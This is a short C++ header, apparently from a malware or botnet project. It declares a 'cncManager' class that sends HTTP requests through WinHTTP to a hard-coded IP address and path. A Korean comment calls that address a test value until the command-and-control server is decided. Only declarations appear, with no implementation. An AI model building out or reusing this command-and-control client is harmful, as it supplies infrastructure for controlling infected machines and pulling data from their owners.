#pragma once
#include <Windows.h>
#include "DDproto.h"
#include <winhttp.h>

class cncManager
{
private:
	LPCWSTR
		/* 일단 C&C 정해지기 전이라 테스트용*/
		server = L"46.4.105.116",
		index = L"/a4247dfc-6bb9-4e95-a705-a39b0f1788ba";

	HINTERNET
		hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	BOOL bResults = FALSE;

public:
	cncManager();
	~cncManager();
	void sendHttpRequest(LPCWSTR data, DWORD dlen);


};
